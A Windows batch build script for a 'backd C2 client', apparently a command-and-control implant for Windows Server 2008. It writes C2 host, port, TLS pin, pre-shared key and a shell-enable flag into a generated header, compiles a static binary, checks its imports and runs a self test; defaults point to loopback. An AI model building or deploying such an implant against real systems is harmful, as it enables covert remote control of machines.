@echo off
setlocal EnableExtensions Enabledelayedexpansion
rem ===========================================================================
rem  backd C2 client - Windows Server 2008 x64 build
rem
rem  - regenerates src\generated_config.h from environment (no literals in src)
rem  - compiles with the *msvcrt* MinGW-w64 toolchain, fully static
rem  - runs the PE import-table gate (no ucrt / vcruntime / libgcc_s)
rem  - runs the crypto/TLV/base64 self test
rem
rem  Usage:
rem    build.cmd                 generate + build + gate + selftest
rem    build.cmd --clean         remove out\
rem
rem  Environment (all optional; defaults are loopback-safe):
rem    C2_CLIENT_DOMAIN  C2_CLIENT_PORT  C2_CLIENT_PATH
rem    C2_SNI  C2_PIN_SHA256  C2_PSK_B64  C2_BUILD_ID
rem    C2_MINGW          path to a MinGW-w64 root (default: E:\mingw64)
rem ===========================================================================

set "ROOT=%~dp0"
cd /d "%ROOT%"

if /I "%~1"=="--clean" (
    if exist out rmdir /s /q out
    echo [clean] out\ removed
    exit /b 0
)

rem ---- toolchain -----------------------------------------------------------
set "GCC=x86_64-w64-mingw32-gcc.exe"
set "OBJDUMP=objdump.exe"
if not "%C2_MINGW%"=="" (
    set "GCC=%C2_MINGW%\bin\x86_64-w64-mingw32-gcc.exe"
    set "OBJDUMP=%C2_MINGW%\bin\objdump.exe"
)
if not exist "%GCC%" (
    where x86_64-w64-mingw32-gcc.exe >nul 2>nul
    if errorlevel 1 (
        echo [error] x86_64-w64-mingw32-gcc.exe not found. Set C2_MINGW.
        exit /b 2
    )
    set "GCC=x86_64-w64-mingw32-gcc.exe"
    set "OBJDUMP=objdump.exe"
)

rem ---- defaults (loopback-safe) -------------------------------------------
if "%C2_CLIENT_DOMAIN%"=="" set "C2_CLIENT_DOMAIN=127.0.0.1"
if "%C2_CLIENT_PORT%"==""   set "C2_CLIENT_PORT=9909"
if "%C2_CLIENT_PATH%"==""   set "C2_CLIENT_PATH=/ws"
if "%C2_BUILD_ID%"==""      set "C2_BUILD_ID=c2c-1.0"
if "%C2_CLIENT_ID%"==""     set "C2_CLIENT_ID=client"
if "%C2_ALLOW_SHELL%"==""   set "C2_ALLOW_SHELL=0"

rem ---- generated_config.h --------------------------------------------------
echo [gen] src\generated_config.h  host=%C2_CLIENT_DOMAIN% port=%C2_CLIENT_PORT% path=%C2_CLIENT_PATH%
> src\generated_config.h echo /* AUTO-GENERATED by build.cmd - do not edit */
>>src\generated_config.h echo #ifndef C2_GENERATED_CONFIG_H
>>src\generated_config.h echo #define C2_GENERATED_CONFIG_H
>>src\generated_config.h echo #define C2_CLIENT_HOST "%C2_CLIENT_DOMAIN%"
>>src\generated_config.h echo #define C2_CLIENT_PORT %C2_CLIENT_PORT%
>>src\generated_config.h echo #define C2_CLIENT_PATH "%C2_CLIENT_PATH%"
>>src\generated_config.h echo #define GEN_SERVER_HOST C2_CLIENT_HOST
>>src\generated_config.h echo #define GEN_SERVER_PORT "%C2_CLIENT_PORT%"
>>src\generated_config.h echo #define GEN_SERVER_PATH C2_CLIENT_PATH
>>src\generated_config.h echo #define GEN_SNI "%C2_SNI%"
>>src\generated_config.h echo #define GEN_PIN_SHA256 "%C2_PIN_SHA256%"
>>src\generated_config.h echo #define GEN_PSK_B64 "%C2_PSK_B64%"
>>src\generated_config.h echo #define GEN_CLIENT_ID "%C2_CLIENT_ID%"
>>src\generated_config.h echo #define GEN_ALLOW_SHELL %C2_ALLOW_SHELL%
>>src\generated_config.h echo #define C2_BUILD_ID "%C2_BUILD_ID%"
>>src\generated_config.h echo #define GEN_BUILD_ID C2_BUILD_ID
>>src\generated_config.h echo #endif
if errorlevel 1 goto :fail

rem ---- compile -------------------------------------------------------------
if not exist out mkdir out
set "SRC=src\main.c src\ws.c src\sha256.c src\aes_gcm.c src\util.c src\json.c src\modules_core.c src\modules_adv.c src\modules_adv2.c"
set "CFLAGS=-O2 -Wall -Wextra -Wno-unused-parameter -Wno-unused-function -Wno-cast-function-type -Wno-format -Wno-misleading-indentation -D_WIN32_WINNT=0x0600 -DWINVER=0x0600"
set "LDFLAGS=-static -static-libgcc -s -lws2_32 -ladvapi32 -lshell32 -luser32 -lgdi32 -liphlpapi -lshlwapi"

echo [build] %GCC%
"%GCC%" %CFLAGS% %SRC% -o out\backd-client.exe %LDFLAGS%
if errorlevel 1 goto :fail
for %%F in (out\backd-client.exe) do echo [build] out\backd-client.exe  %%~zF bytes

rem ---- import gate ---------------------------------------------------------
"%OBJDUMP%" -p out\backd-client.exe > out\imports.txt 2>&1
if errorlevel 1 goto :fail
findstr /I /C:"DLL Name" out\imports.txt > out\imports_dlls.txt
findstr /I /R /C:"api-ms-win" /C:"ucrtbase" /C:"vcruntime" /C:"libgcc_s" /C:"msvcp" out\imports_dlls.txt >nul 2>nul
if not errorlevel 1 (
    echo [gate] FAIL - forbidden runtime imports:
    type out\imports_dlls.txt
    goto :fail
)
findstr /I /C:"DLL Name: msvcrt.dll" out\imports_dlls.txt >nul
if errorlevel 1 (
    echo [gate] WARN - msvcrt.dll not imported ^(unexpected but not fatal^)
) else (
    echo [gate] msvcrt.dll present ^(Server 2008 compatible runtime^)
)
for /f "tokens=1,2" %%A in ('findstr /I /C:"MajorSubsystemVersion" out\imports.txt') do (
    echo [gate] %%A %%B
    if %%B GTR 6 (
        echo [gate] FAIL - subsystem version %%B is newer than Windows Server 2008 ^(6.0^)
        goto :fail
    )
)
echo [gate] PASS - no ucrt/vcruntime/libgcc_s, subsystem ^<= 6
type out\imports_dlls.txt

rem ---- self test ----------------------------------------------------------
echo [selftest]
out\backd-client.exe --selftest
if errorlevel 1 goto :fail

rem End-to-end tests live in ..\tests and require a built server binary.


echo [done] ok
exit /b 0

:fail
echo [error] build step failed
exit /b 1
